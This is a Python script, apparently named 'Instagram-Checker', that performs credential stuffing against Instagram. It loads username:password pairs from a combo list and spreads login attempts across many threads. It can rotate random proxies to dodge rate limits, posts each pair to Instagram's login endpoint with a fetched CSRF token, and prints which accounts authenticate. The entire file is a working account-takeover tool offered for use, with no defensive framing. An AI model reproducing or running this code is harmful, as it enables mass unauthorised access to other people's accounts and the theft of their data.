import requests
import random
import json
import threading


class Instagram_Checker:
    APP_VERSION = "1.0.0"
    INSTAGRAM_INDEX = "https://instagram.com"
    INSTAGRAM_LOGIN_ENDPOINT = "https://www.instagram.com/accounts/login/ajax/"

    def __init__(self):
        self.proxies = []
        self.combo = []
        self.threads = []

        print('Instagram-Checker by @br0keh - v%s' % self.APP_VERSION)

        self.load_lists()

        maxt = input('[?] Max threads: ')
        self.max_threads = 30 if not maxt.isdigit() else int(maxt)

        self.start_all_workers()

    def load_lists(self):
        print('Loading combo from "combo.list"...')
        try:
            self.combo = open('combo.list', 'r').readlines()
        except:
            print('[x] Unable to read combo.list')

        if input('[?] Use proxies? (Y/N):') == 'Y':
            print('Loading combo from "proxies.list"...')
            try:
                self.proxies = open('proxies.list', 'r').readlines()
            except:
                print('[x] Unable to read proxies.list')

    def start_all_workers(self):

        print('[!] Starting %i threads...' % (self.max_threads))

        while len(self.threads) < self.max_threads:
            t = threading.Thread(target=self.worker)
            t.start()
            self.threads.append(t)

    def worker(self):
        while len(self.combo) > 0:
            last = self.combo.pop()
            user = last.split(':')[0]
            pasw = last.split(':')[1]
            self.login(user, pasw)

    def message(self, username, password, message):
        print("%s : %s / %s" % (username, password, message))

    def login(self, username, password):

        password = password.replace('\r', '').replace('\n', '')

        session = requests.Session()

        if len(self.proxies) > 0:
            session.proxies.update({
                'http': 'http://' + random.choice(self.proxies),
                'https': 'https://' + random.choice(self.proxies)
            })

        session.headers.update({
            'ig_vw': '1920',
            'ig_pr': '1'
        })

        session.headers.update({
            'UserAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
            'x-instagram-ajax': '1',
            'X-Requested-With': 'XMLHttpRequest',
            'origin': 'https://www.instagram.com',
            'ContentType': 'application/x-www-form-urlencoded',
            'Connection': 'keep-alive',
            'Accept': '*/*',
            'Referer': 'https://www.instagram.com',
            'authority': 'www.instagram.com',
            'Host': 'www.instagram.com',
            'Accept-Language': 'en-US;q=0.6,en;q=0.4',
            'Accept-Encoding': 'gzip, deflate'
        })

        try:
            request = session.get(self.INSTAGRAM_INDEX)

            csrf_token = request.cookies.get_dict()['csrftoken']

            session.headers.update({
                'X-CSRFToken': csrf_token
            })

            request = session.post(self.INSTAGRAM_LOGIN_ENDPOINT,
                                   data={
                                       'username': username,
                                       'password': password
                                   })

            csrf_token = request.cookies.get_dict()['csrftoken']

            session.headers.update({
                'X-CSRFToken': csrf_token
            })

            response = json.loads(request.text)
        except:
            self.combo.append('%s:%s' % (username, password))
            return self.message(username, password, 'REQUEST ERROR. ADDED TO QUEUE AGAIN...')

        if response['authenticated'] == True:
            return self.message(username, password, 'SUCCESS : [ %s ]' % str(session))
        elif response['status'] == 'fail':
            return self.message(username, password, '%s' % str(response['message']))
        elif response['status'] == 'ok':
            return self.message(username, password, 'WRONG CREDENTIALS')
        else:
            return self.message(username, password, 'UNKNOWN ERROR')


if __name__ == "__main__":
    insta_checker = Instagram_Checker()
